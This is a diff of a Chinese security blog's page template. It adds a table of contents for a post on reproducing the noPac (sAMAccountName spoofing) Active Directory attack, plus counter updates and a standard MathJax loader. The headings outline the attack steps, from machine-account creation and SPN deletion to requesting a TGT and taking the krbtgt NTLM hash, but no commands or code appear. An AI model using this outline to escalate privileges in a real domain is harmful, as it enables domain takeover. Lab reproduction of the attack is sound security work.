+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91"><span class="nav-number">4.</span> <span class="nav-text">复现踩坑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%94%A8%E6%88%B7hello"><span class="nav-number">4.1.</span> <span class="nav-text">创建域用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E8%AE%BE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">4.3.</span> <span class="nav-text">重设机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82tgt"><span class="nav-number">4.4.</span> <span class="nav-text">请求TGT</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7hello"><span class="nav-number">5.1.</span> <span class="nav-text">创建机器用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95-1"><span class="nav-number">5.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#section"><span class="nav-number">5.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E8%AE%BE%E7%BD%AE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">5.4.</span> <span class="nav-text">重新设置机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82tgt-1"><span class="nav-number">5.5.</span> <span class="nav-text">请求TGT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E5%8E%9F%E6%9D%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E5%B1%9E%E6%80%A7"><span class="nav-number">5.6.</span> <span class="nav-text">恢复原来的机器属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.7.</span> <span class="nav-text">获取票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E7%9A%84ntlm-hash"><span class="nav-number">5.8.</span> <span class="nav-text">获取krbtgt用户的NTLM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.9.</span> <span class="nav-text">清除票据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nopac"><span class="nav-number">6.</span> <span class="nav-text">noPac</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B8%A9%E5%AE%8C%E7%9A%84%E5%90%8E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.</span> <span class="nav-text">踩完的后的利用。。。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="nav-number">6.1.1.</span> <span class="nav-text">扫描探测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nopacpython"><span class="nav-number">6.2.</span> <span class="nav-text">noPac（python）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sam_the_admin"><span class="nav-number">6.3.</span> <span class="nav-text">Sam_the_admin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -560,7 +633,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -608,7 +681,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -622,7 +695,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -633,7 +706,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -773,6 +846,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
